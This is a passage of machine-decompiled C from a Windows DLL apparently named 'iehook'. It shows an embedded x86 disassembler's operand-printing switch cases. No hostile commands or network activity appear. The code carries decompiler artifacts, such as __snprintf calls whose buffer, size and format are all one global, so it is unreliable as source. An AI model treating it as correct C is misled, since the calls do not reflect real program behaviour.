                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005c9f
                                    *(char *)(v19 + (int32_t)v264) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v265 = *v254; // 0x10005cad
                                    int32_t v266 = v265; // 0x10005cb3
                                    if ((v265 & 0xe000) == 0) {
                                        // 0x10005cb5
                                        *v260 = 2986;
                                        *v261 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v262 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v266 = *v254;
                                    }
                                    int32_t v267 = v266; // 0x10005cd2
                                    if ((v266 & 0x200000) != 0) {
                                        // 0x10005cd4
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v267 = *v254;
                                    }
                                    int32_t v268 = v267; // 0x10005cec
                                    if ((v267 & 0x100000) != 0) {
                                        // 0x10005cee
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v268 = *v254;
                                    }
                                    int32_t v269 = v268; // 0x10005d06
                                    if ((v268 & 1024) != 0) {
                                        // 0x10005d08
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v269 = *v254;
                                    }
                                    // 0x10005d1a
                                    v72 = v69;
                                    v61 = v269;
                                    v65 = v63;
                                    if ((int16_t)v269 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10005d27
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 34: {
                        // 0x10005620
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x1000562a
                            *(int16_t *)(v79 + 6) = (int16_t)(2 * *v26 & 30);
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v270 = *v26 & 15;
                                int32_t v271; // 0x10003490
                                int32_t v272; // 0x10003490
                                int32_t v273; // 0x10003490
                                if (v270 == 2) {
                                    unsigned char v274 = *v18; // 0x100056ae
                                    int32_t v275 = v274; // 0x100056ae
                                    int32_t v276 = v63 - 4; // 0x100056c7
                                    *(int32_t *)v276 = (int32_t)"<CX:BX>";
                                    v271 = v274 == -1 ? 0 : 256 - v275;
                                    v272 = v275;
                                    v273 = v276;
                                } else {
                                    int32_t v277 = (int32_t)v270 - 4; // 0x10005656
                                    if (v277 == 0) {
                                        unsigned char v278 = *v18; // 0x10005689
                                        int32_t v279 = v278; // 0x10005689
                                        if (v278 == -1) {
                                            int32_t v280 = v63 - 4; // 0x100056a7
                                            *(int32_t *)v280 = (int32_t)"<ECX:EBX>";
                                            v271 = 0;
                                            v272 = v279;
                                            v273 = v280;
                                        } else {
                                            int32_t v281 = v63 - 4; // 0x1000569e
                                            *(int32_t *)v281 = (int32_t)"<ECX:EBX>";
                                            v271 = 256 - v279;
                                            v272 = v279;
                                            v273 = v281;
                                        }
                                    } else {
                                        if (v277 != 4) {
                                            // 0x1000afad
                                            *(int32_t *)(v63 - 4) = 2914;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                        unsigned char v282 = *v18; // 0x10005664
                                        int32_t v283 = v282; // 0x10005664
                                        if (v282 == -1) {
                                            int32_t v284 = v63 - 4; // 0x10005682
                                            *(int32_t *)v284 = (int32_t)"<RCX:RBX>";
                                            v271 = 0;
                                            v272 = v283;
                                            v273 = v284;
                                        } else {
                                            int32_t v285 = v63 - 4; // 0x10005679
                                            *(int32_t *)v285 = (int32_t)"<RCX:RBX>";
                                            v271 = 256 - v283;
                                            v272 = v283;
                                            v273 = v285;
                                        }
                                    }
                                }
                                int32_t v286 = v273;
                                int32_t * v287 = (int32_t *)(v286 - 4); // 0x100056cc
                                *v287 = v271;
                                int32_t * v288 = (int32_t *)(v286 - 8); // 0x100056d4
                                *v288 = v272 + v19;
                                int32_t v289 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100056d5
                                unsigned char v290 = *v18 + (char)v289; // 0x100056da
                                *v18 = v290;
                                int32_t v291 = v286 + 4; // 0x100056e0
                                v74 = v69;
                                v67 = v291;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100056ed
                                    *(char *)(v19 + (int32_t)v290) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v292 = (int32_t *)v79; // 0x100056ff
                                    int32_t v293 = *v292; // 0x100056ff
                                    int32_t v294 = v293; // 0x10005705
                                    if ((v293 & 0xe000) == 0) {
                                        // 0x10005707
                                        *(int32_t *)v286 = 2916;
                                        *v287 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v288 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v294 = *v292;
                                    }
                                    int32_t v295 = v294; // 0x10005724
                                    if ((v294 & 0x200000) != 0) {
                                        // 0x10005726
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v295 = *v292;
                                    }
                                    int32_t v296 = v295; // 0x1000573e
                                    if ((v295 & 0x100000) != 0) {
                                        // 0x10005740
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v296 = *v292;
                                    }
                                    int32_t v297 = v296; // 0x10005758
                                    if ((v296 & 1024) != 0) {
                                        // 0x1000575a
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v297 = *v292;
                                    }
                                    // 0x1000576c
                                    v72 = v69;
                                    v61 = v297;
                                    v65 = v291;
                                    if ((int16_t)v297 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10005779
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v291;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 35: {
                        // 0x1000578a
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10005794
                            *(int16_t *)(v79 + 6) = (int16_t)(2 * *v26 & 30);
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v298 = *v26 & 15;
                                int32_t v299; // 0x10003490
                                int32_t v300; // 0x10003490
                                int32_t v301; // 0x10003490
                                if (v298 == 2) {
                                    unsigned char v302 = *v18; // 0x10005818
                                    int32_t v303 = v302; // 0x10005818
                                    int32_t v304 = v63 - 4; // 0x10005831
                                    *(int32_t *)v304 = (int32_t)"<DX:AX>";
                                    v299 = v302 == -1 ? 0 : 256 - v303;
                                    v300 = v303;
                                    v301 = v304;
                                } else {
                                    int32_t v305 = (int32_t)v298 - 4; // 0x100057c0
                                    if (v305 == 0) {
                                        unsigned char v306 = *v18; // 0x100057f3
                                        int32_t v307 = v306; // 0x100057f3
                                        if (v306 == -1) {
                                            int32_t v308 = v63 - 4; // 0x10005811
                                            *(int32_t *)v308 = (int32_t)"<EDX:EAX>";
                                            v299 = 0;
                                            v300 = v307;
                                            v301 = v308;
                                        } else {
                                            int32_t v309 = v63 - 4; // 0x10005808
                                            *(int32_t *)v309 = (int32_t)"<EDX:EAX>";
                                            v299 = 256 - v307;
                                            v300 = v307;
                                            v301 = v309;
                                        }
                                    } else {
                                        if (v305 != 4) {
                                            // 0x1000afcc
                                            *(int32_t *)(v63 - 4) = 2930;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                        unsigned char v310 = *v18; // 0x100057ce
                                        int32_t v311 = v310; // 0x100057ce
                                        if (v310 == -1) {
                                            int32_t v312 = v63 - 4; // 0x100057ec
                                            *(int32_t *)v312 = (int32_t)"<RDX:RAX>";
                                            v299 = 0;
                                            v300 = v311;
                                            v301 = v312;
                                        } else {
                                            int32_t v313 = v63 - 4; // 0x100057e3
                                            *(int32_t *)v313 = (int32_t)"<RDX:RAX>";
                                            v299 = 256 - v311;
                                            v300 = v311;
                                            v301 = v313;
                                        }
                                    }
                                }
                                int32_t v314 = v301;
                                int32_t * v315 = (int32_t *)(v314 - 4); // 0x10005836
                                *v315 = v299;
                                int32_t * v316 = (int32_t *)(v314 - 8); // 0x1000583e
                                *v316 = v300 + v19;
                                int32_t v317 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000583f
                                unsigned char v318 = *v18 + (char)v317; // 0x10005844
                                *v18 = v318;
                                int32_t v319 = v314 + 4; // 0x1000584a
                                v74 = v69;
                                v67 = v319;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005857
                                    *(char *)(v19 + (int32_t)v318) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v320 = (int32_t *)v79; // 0x10005869
                                    int32_t v321 = *v320; // 0x10005869
                                    int32_t v322 = v321; // 0x1000586f
                                    if ((v321 & 0xe000) == 0) {
                                        // 0x10005871
                                        *(int32_t *)v314 = 2932;
                                        *v315 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v316 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v322 = *v320;
                                    }
                                    int32_t v323 = v322; // 0x1000588e
                                    if ((v322 & 0x200000) != 0) {
                                        // 0x10005890
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v323 = *v320;
                                    }
                                    int32_t v324 = v323; // 0x100058a8
                                    if ((v323 & 0x100000) != 0) {
                                        // 0x100058aa
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v324 = *v320;
                                    }
                                    int32_t v325 = v324; // 0x100058c2
                                    if ((v324 & 1024) != 0) {
                                        // 0x100058c4
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v325 = *v320;
                                    }
                                    // 0x100058d6
                                    v72 = v69;
                                    v61 = v325;
                                    v65 = v319;
                                    if ((int16_t)v325 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x100058e3
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v319;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 36: {
                        // 0x100058f4
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100058fe
                            *(int16_t *)(v79 + 6) = 8;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v326 = *v18; // 0x10005911
                                int32_t v327 = v326; // 0x10005911
                                int32_t * v328 = (int32_t *)(v63 - 4); // 0x1000592a
                                *v328 = (int32_t)"<EDX:EAX>";
                                int32_t * v329 = (int32_t *)(v63 - 8); // 0x1000592f
                                *v329 = v326 == -1 ? 0 : 256 - v327;
                                int32_t * v330 = (int32_t *)(v63 - 12); // 0x10005937
                                *v330 = v19 + v327;
                                int32_t v331 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005938
                                unsigned char v332 = *v18 + (char)v331; // 0x1000593d
                                *v18 = v332;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005956
                                    *(char *)(v19 + (int32_t)v332) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v333 = (int32_t *)v79; // 0x10005964
                                    int32_t v334 = *v333; // 0x10005964
                                    int32_t v335 = v334; // 0x1000596a
                                    if ((v334 & 0xe000) == 0) {
                                        // 0x1000596c
                                        *v328 = 2944;
                                        *v329 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v330 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v335 = *v333;
                                    }
                                    int32_t v336 = v335; // 0x10005989
                                    if ((v335 & 0x200000) != 0) {
                                        // 0x1000598b
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v336 = *v333;
                                    }
                                    int32_t v337 = v336; // 0x100059a3
                                    if ((v336 & 0x100000) != 0) {
                                        // 0x100059a5
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v337 = *v333;
                                    }
                                    int32_t v338 = v337; // 0x100059bd
                                    if ((v337 & 1024) != 0) {
                                        // 0x100059bf
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v338 = *v333;
                                    }
                                    // 0x100059d1
                                    v72 = v69;
                                    v61 = v338;
                                    v65 = v63;
                                    if ((int16_t)v338 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x100059de
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 37: {
                        goto lab_0x100059ef;
                    }
                    case 48: {
                        // 0x100065a8
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100065b2
                            *(int16_t *)(v79 + 6) = 10;
                            char * v339 = (char *)(v79 + 4); // 0x100065bb
                            *v339 = *v339 & -64 | 3;
                            int32_t * v340 = (int32_t *)v79;
                            *v340 = *v340 | 128;
                            int32_t v341 = (int32_t)(*(char *)(v1 + 741) & 7 | 64); // 0x100065d7
                            *(int32_t *)(v79 + 16) = v341;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v342 = *v18; // 0x100065e7
                                int32_t v343 = v342; // 0x100065e7
                                int32_t v344 = v63 - 4; // 0x10006607
                                int32_t * v345 = (int32_t *)v344; // 0x10006607
                                *v345 = *(int32_t *)(4 * v341 + (int32_t)&g68);
                                *(int32_t *)(v63 - 8) = (int32_t)"<%s>";
                                *(int32_t *)(v63 - 12) = v342 == -1 ? 0 : 256 - v343;
                                *(int32_t *)(v63 - 16) = v19 + v343;
                                int32_t v346 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006616
                                unsigned char v347 = *v18 + (char)v346; // 0x1000661b
                                *v18 = v347;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10006634
                                    *(char *)(v19 + (int32_t)v347) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v348 = *v340; // 0x10006642
                                    v60 = v348;
                                    v59 = v340;
                                    v71 = v69;
                                    v68 = v63;
                                    if ((v348 & 0xe000) != 0) {
                                        goto lab_0x10004487;
                                    } else {
                                        // 0x1000664e
                                        *v345 = 3093;
                                        v58 = v340;
                                        v70 = v69;
                                        v64 = v344;
                                        goto lab_0x10004475;
                                    }
                                }
                            }
                        }
                    }
                    case 49: {
                        // 0x10006658
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10006662
                            *(int16_t *)(v79 + 6) = 10;
                            char * v349 = (char *)(v79 + 4); // 0x1000666b
                            *v349 = *v349 & -64 | 3;
                            int32_t * v350 = (int32_t *)v79; // 0x10006675
                            *v350 = *v350 | 128;
                            *(int32_t *)(v79 + 16) = 64;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v351 = *v18; // 0x1000668c
                                int32_t v352 = v351; // 0x1000668c
                                int32_t * v353 = (int32_t *)(v63 - 4); // 0x100066ab
                                *v353 = *(int32_t *)&g70;
                                int32_t * v354 = (int32_t *)(v63 - 8); // 0x100066ac
                                *v354 = (int32_t)"<%s>";
                                int32_t * v355 = (int32_t *)(v63 - 12); // 0x100066b1
                                *v355 = v351 == -1 ? 0 : 256 - v352;
                                *(int32_t *)(v63 - 16) = v19 + v352;
                                int32_t v356 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100066ba
                                unsigned char v357 = *v18 + (char)v356; // 0x100066bf
                                *v18 = v357;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100066d8
                                    *(char *)(v19 + (int32_t)v357) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v358 = *v350; // 0x100066e6
                                    int32_t v359 = v358; // 0x100066ec
                                    if ((v358 & 0xe000) == 0) {
                                        // 0x100066ee
                                        *v353 = 3106;
                                        *v354 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v355 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v359 = *v350;
                                    }
                                    int32_t v360 = v359; // 0x1000670b
                                    if ((v359 & 0x200000) != 0) {
                                        // 0x1000670d
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v360 = *v350;
                                    }
                                    int32_t v361 = v360; // 0x10006725
                                    if ((v360 & 0x100000) != 0) {
                                        // 0x10006727
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v361 = *v350;
                                    }
                                    int32_t v362 = v361; // 0x1000673f
                                    if ((v361 & 1024) != 0) {
                                        // 0x10006741
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v362 = *v350;
                                    }
                                    // 0x10006753
                                    v72 = v69;
                                    v61 = v362;
                                    v65 = v63;
                                    if ((int16_t)v362 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006760
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 50: {
                        // 0x10006771
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x1000677b
                            *(int16_t *)(v79 + 6) = 10;
                            char * v363 = (char *)(v79 + 4); // 0x10006784
                            *v363 = *v363 & -64 | 3;
                            int32_t * v364 = (int32_t *)v79; // 0x10006790
                            *v364 = *v364 | 128;
                            *(int32_t *)(v79 + 16) = 65;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v365 = *v18; // 0x100067a7
                                int32_t v366 = v365; // 0x100067a7
                                int32_t * v367 = (int32_t *)(v63 - 4); // 0x100067c6
                                *v367 = *(int32_t *)&g71;
                                int32_t * v368 = (int32_t *)(v63 - 8); // 0x100067c7
                                *v368 = (int32_t)"<%s>";
                                int32_t * v369 = (int32_t *)(v63 - 12); // 0x100067cc
                                *v369 = v365 == -1 ? 0 : 256 - v366;
                                *(int32_t *)(v63 - 16) = v19 + v366;
                                int32_t v370 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100067d5
                                unsigned char v371 = *v18 + (char)v370; // 0x100067da
                                *v18 = v371;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100067f3
                                    *(char *)(v19 + (int32_t)v371) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v372 = *v364; // 0x10006801
                                    int32_t v373 = v372; // 0x10006807
                                    if ((v372 & 0xe000) == 0) {
                                        // 0x10006809
                                        *v367 = 3119;
                                        *v368 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v369 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v373 = *v364;
                                    }
                                    int32_t v374 = v373; // 0x10006826
                                    if ((v373 & 0x200000) != 0) {
                                        // 0x10006828
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v374 = *v364;
                                    }
                                    int32_t v375 = v374; // 0x10006840
                                    if ((v374 & 0x100000) != 0) {
                                        // 0x10006842
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v375 = *v364;
                                    }
                                    int32_t v376 = v375; // 0x1000685a
                                    if ((v375 & 1024) != 0) {
                                        // 0x1000685c
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v376 = *v364;
                                    }
                                    // 0x1000686e
                                    v72 = v69;
                                    v61 = v376;
                                    v65 = v63;
                                    if ((int16_t)v376 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000687b
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 51: {
                        // 0x1000688c
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10006896
                            *(int16_t *)(v79 + 6) = 2;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v377 = *v18; // 0x100068a9
                                int32_t v378 = v377; // 0x100068a9
                                int32_t * v379 = (int32_t *)(v63 - 4); // 0x100068c2
                                *v379 = (int32_t)"<FPUSTAT>";
                                int32_t * v380 = (int32_t *)(v63 - 8); // 0x100068c7
                                *v380 = v377 == -1 ? 0 : 256 - v378;
                                int32_t * v381 = (int32_t *)(v63 - 12); // 0x100068cf
                                *v381 = v19 + v378;
                                int32_t v382 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100068d0
                                unsigned char v383 = *v18 + (char)v382; // 0x100068d5
                                *v18 = v383;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100068ee
                                    *(char *)(v19 + (int32_t)v383) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v384 = (int32_t *)v79; // 0x100068fc
                                    int32_t v385 = *v384; // 0x100068fc
                                    int32_t v386 = v385; // 0x10006902
                                    if ((v385 & 0xe000) == 0) {
                                        // 0x10006904
                                        *v379 = 3129;
                                        *v380 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v381 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v386 = *v384;
                                    }
                                    int32_t v387 = v386; // 0x10006921
                                    if ((v386 & 0x200000) != 0) {
                                        // 0x10006923
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v387 = *v384;
                                    }
                                    int32_t v388 = v387; // 0x1000693b
                                    if ((v387 & 0x100000) != 0) {
                                        // 0x1000693d
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v388 = *v384;
                                    }
                                    int32_t v389 = v388; // 0x10006955
                                    if ((v388 & 1024) != 0) {
                                        // 0x10006957
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v389 = *v384;
                                    }
                                    // 0x10006969
                                    v72 = v69;
                                    v61 = v389;
                                    v65 = v63;
                                    if ((int16_t)v389 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006976
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 52: {
                        // 0x10006987
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10006991
                            *(int16_t *)(v79 + 6) = 2;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v390 = *v18; // 0x100069a4
                                int32_t v391 = v390; // 0x100069a4
                                int32_t * v392 = (int32_t *)(v63 - 4); // 0x100069bd
                                *v392 = (int32_t)"<FPUCTRL>";
                                int32_t * v393 = (int32_t *)(v63 - 8); // 0x100069c2
                                *v393 = v390 == -1 ? 0 : 256 - v391;
                                int32_t * v394 = (int32_t *)(v63 - 12); // 0x100069ca
                                *v394 = v19 + v391;
                                int32_t v395 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100069cb
                                unsigned char v396 = *v18 + (char)v395; // 0x100069d0
                                *v18 = v396;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100069e9
                                    *(char *)(v19 + (int32_t)v396) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v397 = (int32_t *)v79; // 0x100069f7
                                    int32_t v398 = *v397; // 0x100069f7
                                    int32_t v399 = v398; // 0x100069fd
                                    if ((v398 & 0xe000) == 0) {
                                        // 0x100069ff
                                        *v392 = 3139;
                                        *v393 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v394 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v399 = *v397;
                                    }
                                    int32_t v400 = v399; // 0x10006a1c
                                    if ((v399 & 0x200000) != 0) {
                                        // 0x10006a1e
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v400 = *v397;
                                    }
                                    int32_t v401 = v400; // 0x10006a36
                                    if ((v400 & 0x100000) != 0) {
                                        // 0x10006a38
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v401 = *v397;
                                    }
                                    int32_t v402 = v401; // 0x10006a50
                                    if ((v401 & 1024) != 0) {
                                        // 0x10006a52
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v402 = *v397;
                                    }
                                    // 0x10006a64
                                    v72 = v69;
                                    v61 = v402;
                                    v65 = v63;
                                    if ((int16_t)v402 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006a71
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 53: {
                        // 0x10006a82
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10006a8c
                            *(int16_t *)(v79 + 6) = 2;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v403 = *v18; // 0x10006a9f
                                int32_t v404 = v403; // 0x10006a9f
                                int32_t * v405 = (int32_t *)(v63 - 4); // 0x10006ab8
                                *v405 = (int32_t)"<FPUTAG>";
                                int32_t * v406 = (int32_t *)(v63 - 8); // 0x10006abd
                                *v406 = v403 == -1 ? 0 : 256 - v404;
                                int32_t * v407 = (int32_t *)(v63 - 12); // 0x10006ac5
                                *v407 = v19 + v404;
                                int32_t v408 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006ac6
                                unsigned char v409 = *v18 + (char)v408; // 0x10006acb
                                *v18 = v409;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10006ae4
                                    *(char *)(v19 + (int32_t)v409) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v410 = (int32_t *)v79; // 0x10006af2
                                    int32_t v411 = *v410; // 0x10006af2
                                    int32_t v412 = v411; // 0x10006af8
                                    if ((v411 & 0xe000) == 0) {
                                        // 0x10006afa
                                        *v405 = 3149;
                                        *v406 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v407 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v412 = *v410;
                                    }
                                    int32_t v413 = v412; // 0x10006b17
                                    if ((v412 & 0x200000) != 0) {
                                        // 0x10006b19
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v413 = *v410;
                                    }
                                    int32_t v414 = v413; // 0x10006b31
                                    if ((v413 & 0x100000) != 0) {
                                        // 0x10006b33
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v414 = *v410;
                                    }
                                    int32_t v415 = v414; // 0x10006b4b
                                    if ((v414 & 1024) != 0) {
                                        // 0x10006b4d
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v415 = *v410;
                                    }
                                    // 0x10006b5f
                                    v72 = v69;
                                    v61 = v415;
                                    v65 = v63;
                                    if ((int16_t)v415 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006b6c
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
